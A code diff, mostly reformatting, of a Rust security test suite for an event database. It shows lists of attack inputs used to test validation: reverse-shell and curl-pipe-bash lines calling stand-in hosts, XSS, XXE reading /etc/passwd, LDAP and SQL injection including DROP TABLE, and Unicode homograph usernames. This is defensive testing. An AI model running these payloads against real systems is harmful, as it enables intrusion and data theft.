@@ -11,12 +11,12 @@
 // - **Query Interface**: API security and exploit prevention
 // - **Unicode Exploits**: Character encoding and normalization attacks
 
-use xtask::sandbox::prelude::*;
-use sinex_primitives::db::validation::EventValidator;
-use sinex_primitives::db::models::{EventFactory, services, event_types};
+use sinex_db::models::{event_types, services, EventFactory};
+use sinex_db::validation::EventValidator;
 use sinex_primitives::Timestamp;
-use std::fs;
 use std::collections::HashMap;
+use std::fs;
+use xtask::sandbox::prelude::*;
 
 /// Path traversal test scenario definition
 #[derive(Debug, Clone)]
@@ -273,15 +273,12 @@ async fn test_unicode_normalization_attacks(ctx: TestContext) -> TestResult<()> 
         ("admin\u{FEFF}", "admin with zero-width no-break space"),
         ("admin\u{200C}", "admin with zero-width non-joiner"),
         ("admin\u{200D}", "admin with zero-width joiner"),
-
         // Homograph attacks
         ("аdmin", "cyrillic 'a' instead of latin"),
         ("аdmіn", "multiple cyrillic characters"),
-
         // Case normalization
         ("ADMIN", "uppercase variant"),
         ("AdMiN", "mixed case variant"),
-
         // Combining characters
         ("admin\u{0301}", "admin with combining acute accent"),
         ("a\u{0300}dmin", "a with combining grave accent"),
@@ -447,7 +444,11 @@ async fn test_resource_exhaustion_protection(ctx: TestContext) -> TestResult<()>
     println!("Resource exhaustion test results:");
     println!("  Large JSON: Handled appropriately");
     println!("  Deep nesting: Handled appropriately");
-    println!("  Rapid inserts: {} events in {:?}", insert_count, start.elapsed());
+    println!(
+        "  Rapid inserts: {} events in {:?}",
+        insert_count,
+        start.elapsed()
+    );
 
     Ok(())
 }
@@ -465,24 +466,22 @@ async fn test_malicious_input_validation(ctx: TestContext) -> TestResult<()> {
         ("| nc attacker.com 4444", "reverse shell"),
         ("$(curl evil.com/script.sh | bash)", "command substitution"),
         ("`id`", "backtick command execution"),
-
         // XSS attempts
         ("<script>alert('xss')</script>", "basic XSS"),
         ("<img src=x onerror=alert(1)>", "img tag XSS"),
         ("javascript:alert(1)", "javascript protocol"),
         ("<iframe src='evil.com'></iframe>", "iframe injection"),
-
         // LDAP injection
         ("*)(uid=*", "LDAP wildcard"),
         ("admin)(|(password=*))", "LDAP filter manipulation"),
-
         // XML injection
-        ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "XXE attack"),
-
+        (
+            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+            "XXE attack",
+        ),
         // Format string
         ("%x%x%x%x", "format string"),
         ("%n%n%n%n", "format string write"),
-
         // Buffer overflow attempts
         ("A" * 10000, "buffer overflow attempt"),
         ("\x41" * 5000, "hex buffer overflow"),
@@ -503,7 +502,15 @@ async fn test_malicious_input_validation(ctx: TestContext) -> TestResult<()> {
 
     println!("Malicious input validation results:");
     for (attack_type, accepted) in &validation_results {
-        println!("  {}: {}", attack_type, if *accepted { "Accepted as data" } else { "Rejected" });
+        println!(
+            "  {}: {}",
+            attack_type,
+            if *accepted {
+                "Accepted as data"
+            } else {
+                "Rejected"
+            }
+        );
     }
 
     // All inputs should be safely handled (either rejected or accepted as harmless data)
@@ -522,7 +529,7 @@ async fn test_query_interface_exploits(ctx: TestContext) -> TestResult<()> {
     for i in 0..5 {
         let event = factory.create_event(
             event_types::test::GENERIC,
-            json!({ "index": i, "sensitive": "secret_data" })
+            json!({ "index": i, "sensitive": "secret_data" }),
         )?;
         ctx.pool.events().insert(event).await?;
     }
@@ -532,17 +539,17 @@ async fn test_query_interface_exploits(ctx: TestContext) -> TestResult<()> {
         // Time-based attacks
         ("1' AND SLEEP(5)--", "time-based blind SQL"),
         ("1' AND pg_sleep(5)--", "PostgreSQL sleep"),
-
         // Boolean-based blind SQL
         ("1' AND 1=1--", "boolean true condition"),
         ("1' AND 1=2--", "boolean false condition"),
-
         // Union-based attacks
         ("1' UNION SELECT version()--", "version disclosure"),
         ("1' UNION SELECT current_user--", "user disclosure"),
-
         // Stacked queries
-        ("1'; INSERT INTO events VALUES (null)--", "stacked query insert"),
+        (
+            "1'; INSERT INTO events VALUES (null)--",
+            "stacked query insert",
+        ),
         ("1'; DROP TABLE events--", "stacked query drop"),
     ];
 
